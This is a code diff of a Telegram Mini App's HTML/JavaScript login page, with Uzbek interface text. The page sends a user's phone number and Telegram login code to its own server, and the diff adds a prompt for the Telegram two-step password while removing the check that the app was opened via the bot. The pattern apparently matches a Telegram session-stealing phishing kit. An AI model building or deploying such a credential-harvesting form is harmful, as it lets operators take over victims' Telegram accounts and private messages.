@@ -164,15 +164,6 @@ function showMsg(text, type="info") {
 
 async function sendCode() {
   const phone = phoneEl.value.trim();
-  const tgUser = tg.initDataUnsafe && tg.initDataUnsafe.user;
-
-  if (!tgUser) {
-    showMsg(
-      "❌ Mini App bot orqali ochilmagan.\nIltimos, botdagi tugma orqali kiring.",
-      "error"
-    );
-    return;
-  }
 
   if (!phone) {
     showMsg("❌ Telefon raqamni kiriting", "error");
@@ -185,10 +176,7 @@ async function sendCode() {
     const res = await fetch("/send_code", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({
-        phone,
-        user_id: tgUser.id
-      })
+      body: JSON.stringify({ phone })
     });
 
     const data = await res.json();
@@ -207,9 +195,8 @@ async function sendCode() {
 }
 
 async function verifyCode() {
-  const code = codeEl.value.trim();
   const phone = phoneEl.value.trim();
-  const user = tg.initDataUnsafe?.user;
+  const code = codeEl.value.trim();
 
   if (!code) {
     showMsg("❌ Kodni kiriting", "error");
@@ -222,11 +209,7 @@ async function verifyCode() {
     const res = await fetch("/verify_code", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({
-        phone,
-        code,
-        user_id: user.id
-      })
+      body: JSON.stringify({ phone, code })
     });
 
     const data = await res.json();
@@ -234,6 +217,8 @@ async function verifyCode() {
     if (data.status === "ok") {
       showMsg("✅ Muvaffaqiyatli kirdingiz", "success");
       setTimeout(() => tg.close(), 1200);
+    } else if (data.status === "2fa_required") {
+      showMsg("🔐 Telegram paroli talab qilinadi", "info");
     } else {
       showMsg(data.message || "❌ Kod noto‘g‘ri", "error");
     }
@@ -243,13 +228,8 @@ async function verifyCode() {
   }
 }
 
-document
-  .getElementById("sendCodeBtn")
-  .addEventListener("click", sendCode);
-
-document
-  .getElementById("verifyCodeBtn")
-  .addEventListener("click", verifyCode);
+document.getElementById("sendCodeBtn").onclick = sendCode;
+document.getElementById("verifyCodeBtn").onclick = verifyCode;
 </script>
 </body>
 </html>
